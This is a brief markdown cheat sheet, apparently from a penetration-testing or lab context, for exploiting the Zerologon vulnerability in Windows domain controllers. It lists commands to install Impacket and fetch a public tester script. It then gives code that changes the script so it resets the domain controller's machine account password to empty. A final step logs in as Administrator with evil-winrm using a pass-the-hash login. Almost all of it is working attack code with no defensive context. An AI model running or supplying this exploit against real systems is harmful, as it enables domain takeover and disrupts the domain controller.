# Zero Logon

## Impacket Instalation

```
python3 -m pip install virtualenv
python3 -m virtualenv impacketEnv
source impacketEnv/bin/activate
pip install git+https://github.com/SecureAuthCorp/impacket
```

## Downloading PoC

```
wget https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_tester.py
```

## Modifying PoC

```
  # assert server_auth['ErrorCode'] == 0
  newPassRequest = nrpc.NetrServerPasswordSet2()
  newPassRequest['PrimaryName'] = dc_handle + '\x00'
  newPassRequest['AccountName'] = target_computer + '$\x00'
  newPassRequest['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
  auth = nrpc.NETLOGON_AUTHENTICATOR()
  auth['Credential'] = b'\x00' * 8
  auth['Timestamp'] = 0
  newPassRequest['Authenticator'] = auth
  newPassRequest['ComputerName'] = target_computer + '\x00'
  newPassRequest['ClearNewPassword'] =  b'\x00' * 516
  rpc_con.request(newPassRequest)
  # return rpc_con
```

## Profit

```
evil-winrm -u Administrator -H <LOCAL_ADMIN_HASH> -i <RHOST>
```
